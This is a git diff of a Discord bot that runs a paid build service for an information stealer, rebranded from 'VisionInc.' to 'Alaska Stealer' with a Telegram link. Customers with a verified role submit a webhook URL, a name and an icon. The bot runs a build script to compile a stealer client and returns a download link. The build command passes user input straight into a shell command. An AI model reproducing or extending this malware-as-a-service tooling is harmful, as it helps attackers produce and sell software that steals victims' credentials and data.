@@ -15,9 +15,9 @@ const { MessageEmbed } = require('discord.js');
 var queue = [];
 
 //infos
-const clientId = config.ID;
-const guildId = config.SERVERID;
-const verifiedRole = config.roleCustomersId;
+const clientId = "1135536674340880414";
+const guildId = "1133461496165306438";
+const verifiedRole = "1139277028516958271";
 
 function generateId(len) {
     var text = "";
@@ -33,35 +33,35 @@ function sleep(ms) {
 
 const buildstarted = new MessageEmbed()
     .setColor(0xFF001A)
-    .setTitle('VisionInc.')
-    .setURL(config.TELEGRAMLINK)
-    .setDescription(`Started ur build... ETA: 1m ${config.emojiTime}`)
+    .setTitle('Alaska Stealer')
+    .setURL("https://t.me/St34ler")
+    .setDescription(`Started your build... ETA: 1M  `)
     .setTimestamp()
-    .setFooter({ text: '@VisionV2', iconURL: config.LOGOURL });
+    .setFooter({ text: '@alaskastealer', iconURL: "" });
 
 const invalidicodetected = new MessageEmbed()
     .setColor(0xFF001A)
-    .setTitle('VisionInc.')
-    .setURL(config.TELEGRAMLINK)
-    .addFields({ name: `ERROR: Invalid .ico detected, build process aborted. ${config.emojiError}`, value: '*Please retry with .ico file*', inline: true })
+    .setTitle('Alaska Stealer')
+    .setURL("https://t.me/St34ler")
+    .addFields({ name: `Error: Invalid .ico detected, build process aborted.`, value: '*Please retry with .ico file*', inline: true })
     .setTimestamp()
-    .setFooter({ text: '@VisionV2', iconURL: config.LOGOURL });
+    .setFooter({ text: '@alaskastealer', iconURL: "" });
 
 const invalidicodetected2 = new MessageEmbed()
     .setColor(0xFF001A)
-    .setTitle('VisionInc.')
-    .setURL(config.TELEGRAMLINK)
-    .addFields({ name: `ERROR: Invalid .ico detected, build process aborted. ${config.emojiError}`, value: '*Please retry with 64x64 ico file, if not work, contact an admin.*', inline: true })
+    .setTitle('Alaska Stealer')
+    .setURL("https://t.me/St34ler")
+    .addFields({ name: `Error: Invalid .ico detected, build process aborted.  `, value: '*Please retry with 64x64 ico file, if not work, contact an admin.*', inline: true })
     .setTimestamp()
-    .setFooter({ text: '@VisionV2', iconURL: config.LOGOURL });
+    .setFooter({ text: '@alaskastealer', iconURL: "" });
 
 const noverifiedrole = new MessageEmbed()
     .setColor(0xFF001A)
-    .setTitle('VisionInc.')
-    .setURL(config.TELEGRAMLINK)
-    .addFields({ name: `ERROR: You don\'t have verified role, build process aborted. ${config.emojiError}`, value: '*if it\'s a bug do /refresh in Vision server.*', inline: true })
+    .setTitle('Alaska Stealer')
+    .setURL("https://t.me/St34ler")
+    .addFields({ name: `Error: You don\'t have customer role, build process aborted.  `, value: '*if it\'s a bug do /refresh in Alaska Stealer server.*', inline: true })
     .setTimestamp()
-    .setFooter({ text: '@VisionV2', iconURL: config.LOGOURL });
+    .setFooter({ text: '@alaskastealer', iconURL: "" });
 
 let expression = /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/gi;
 let urlMatch = new RegExp(expression);
@@ -81,30 +81,30 @@ async function queueLoop() {
             try {
             await exec(`cd Client && node build.js ${element.webhook_url} ${element.name}`)
             } catch (e) {console.log(e)}
-            const gofileurl = fs.readFileSync('/root/Blaze/Client/link.txt');
+            const gofileurl = fs.readFileSync('/root/Alaska/Blaze/link.txt');
             const downloadlink1 = new MessageEmbed()
                 .setColor(0xFF001A)
-                .setTitle('VisionInc.')
-                .setURL(config.TELEGRAMLINK)
-                .setDescription(`Download link: [Download](${gofileurl}) ${config.emojiFile}`)
+                .setTitle('Alaska Stealer')
+                .setURL("https://t.me/St34ler")
+                .setDescription(`Download link: [Download](${gofileurl}) `)
                 .setTimestamp()
-                .setFooter({ text: '@VisionV2', iconURL: config.LOGOURL });
+                .setFooter({ text: '@alaskastealer', iconURL: "" });
             element.interaction.editReply({embeds: [downloadlink1]});
-            fs.rmSync(`/root/Blaze/Client/link.txt`)
+            fs.rmSync(`/root/Alaska/Blaze/Client/link.txt`)
         } else {
             try {
             fs.appendFileSync("link.txt", "");
             await exec(`cd Client && node build.js ${element.webhook_url} ${element.name}`)
-            const gofileurl = fs.readFileSync('/root/Blaze/Client/link.txt');
+            const gofileurl = fs.readFileSync('/root/Alaska/Blaze/link.txt');
             const downloadlink2 = new MessageEmbed()
             .setColor(0xFF001A)
-            .setTitle('VisionInc.')
-            .setURL(config.TELEGRAMLINK)
-            .setDescription(`Download link: [Download](${gofileurl}) ${config.emojiFile}`)
+            .setTitle('Alaska Stealer')
+            .setURL("https://t.me/St34ler")
+            .setDescription(`Download link: [Download](${gofileurl}) `)
             .setTimestamp()
-            .setFooter({ text: '@VisionV2', iconURL: config.LOGOURL });
+            .setFooter({ text: '@alaskastealer', iconURL: "" });
             element.interaction.editReply({embeds: [downloadlink2]});
-            fs.rmSync('/root/Blaze/Client/link.txt');
+            fs.rmSync('/root/Alaska/Blaze/link.txt');
         } catch (e) {console.log(e), element.interaction.editReply({embeds: [invalidicodetected2]})}
         }
     }
@@ -146,19 +146,19 @@ module.exports = {
 
     const queue1 = new MessageEmbed()
         .setColor(0xFF001A)
-        .setTitle('VisionInc.')
-        .setURL(config.TELEGRAMLINK)
-        .addFields({ name: `Sucessfully added ur build to queue ${config.emojiDone}`, value:`*Queue size: ${queue.length}, ETA: ${queue.length*2}m*`, inline: true })
+        .setTitle('Alaska Stealer')
+        .setURL("https://t.me/St34ler")
+        .addFields({ name: `Successfully added your build to queue.. `, value:`*Queue size: ${queue.length}, ETA: ${queue.length*2}m*`, inline: true })
         .setTimestamp()
-        .setFooter({ text: '@VisionV2', iconURL: config.LOGOURL });
+        .setFooter({ text: '@alaskastealer', iconURL: "" });
 
     const queue2 = new MessageEmbed()
         .setColor(0xFF001A)
-        .setTitle('VisionInc.')
-        .setURL(config.TELEGRAMLINK)
-        .addFields({ name: `Sucessfully added ur build to queue ${config.emojiDone}`, value:`*Queue size: ${queue.length+1}, ETA: ${(queue.length+1)*2}m*`, inline: true })
+        .setTitle('Alaska Stealer')
+        .setURL("https://t.me/St34ler")
+        .addFields({ name: `Successfully added your build to queue `, value:`*Queue size: ${queue.length+1}, ETA: ${(queue.length+1)*2}m*`, inline: true })
         .setTimestamp()
-        .setFooter({ text: '@VisionV2', iconURL: config.LOGOURL });
+        .setFooter({ text: '@alaskastealer', iconURL: "" });
     interaction.reply({embeds: [queue2]});
     try {
         const file = fs.createWriteStream(process.cwd() + `/Client/${build_id}.ico`);
